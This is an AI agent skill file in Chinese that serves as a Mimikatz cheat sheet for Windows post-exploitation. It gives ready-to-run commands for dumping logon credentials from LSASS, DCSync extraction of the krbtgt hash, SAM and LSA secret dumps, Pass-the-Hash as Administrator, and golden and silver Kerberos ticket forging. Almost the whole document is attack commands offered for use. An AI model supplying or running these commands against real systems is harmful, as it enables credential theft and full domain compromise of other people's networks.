---
name: mimikatz
description: >
  此技能适用于用户询问关于 "mimikatz"、"Windows 后渗透凭据收集"、
  "基于 Kerberos 的横向移动"、"LSASS 转储"、"PtH (Pass-the-Hash) 和 PtT (Pass-the-Ticket)" 的问题。
---

# Mimikatz

Windows 凭据提取与 Kerberos 攻击工具。

## 快速开始

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"
```

## 核心模块

| 模块::命令 | 用途 |
|----------------|---------|
| `privilege::debug` | 启用 SeDebugPrivilege（必须先执行） |
| `sekurlsa::logonpasswords` | 从 LSASS 转储缓存凭据 |
| `sekurlsa::pth` | PtH — 使用 NTLM 哈希生成进程 |
| `sekurlsa::tickets` | 列出/转储 Kerberos 票据 |
| `kerberos::ptt <ticket.kirbi>` | PtT — 注入票据 |
| `lsadump::sam` | 转储 SAM 数据库哈希 |
| `lsadump::dcsync /user:<u>` | DCSync — 从域控提取哈希 |
| `lsadump::lsa /patch` | 修补 LSA 并转储机密 |
| `kerberos::golden` | 创建黄金票据 (Golden Ticket) |
| `kerberos::silver` | 创建白银票据 (Silver Ticket) |
| `crypto::certificates` | 转储证书 |

## Pass-the-Hash

```
sekurlsa::pth /user:Administrator /domain:CORP /ntlm:<hash> /run:cmd.exe
```

## DCSync（需要域管理员权限或复制权限）

```
lsadump::dcsync /domain:corp.local /user:krbtgt
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | 黄金/白银票据语法、DPAPI、令牌操作 |
